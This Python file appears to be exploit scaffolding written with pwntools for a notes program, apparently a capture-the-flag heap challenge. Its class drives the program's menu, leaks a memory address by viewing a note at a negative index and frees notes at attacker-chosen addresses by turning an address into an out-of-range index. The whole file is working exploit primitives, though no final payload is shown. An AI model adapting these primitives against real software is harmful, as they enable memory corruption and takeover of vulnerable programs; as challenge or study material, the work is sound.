from pwn import *
import ctypes

ADD_NOTE = 1
REMOVE_NOTE = 2
VIEW_NOTE = 4


class NotesPrimitives():

    def __init__(self, conn) -> None:
        self._conn = conn
        self._created_entries: ctypes.c_int8 = ctypes.c_int8(0)
        self._entries_address: int = self._leak_initial_entries_address()

    @property
    def conn(self) -> process:
        return self._conn

    @property
    def entries_address(self):
        return self._entries_address 

    def _leak_initial_entries_address(self) -> int:
        return self.view_note(-9) + 0x48

    def _validate_promt(self) -> None:
        self._conn.recvuntil(b'Enter an option: ')

    def add_note(self, data: bytes, size: int = None) -> None:
        self._validate_promt()

        assert self._created_entries.value <= 2, "max entries created"

        if size is None:
            size = len(data)

        self._conn.sendline(str(ADD_NOTE).encode())
        self._conn.sendline(str(size).encode())
        self._conn.sendline(data)

        self._created_entries.value += 1

    def remove_note(self, index: int = 3) -> None:
        self._validate_promt()
        self._conn.sendline(str(REMOVE_NOTE).encode())
        self._conn.sendline(str(index).encode())

        self._created_entries.value -= 1

    def remove_note_at_address(self, address: int) -> None:
        self.remove_note((address - self._entries_address) // 8)

    def view_note(self, index: int) -> int:
        self._validate_promt()
        self._conn.sendline(str(VIEW_NOTE).encode())
        self._conn.sendline(str(index).encode())
        self._conn.recvuntil(b'This note is located at: ')
        address = self._conn.recvline()[:14]
        address = int(address, base=16)

        return address
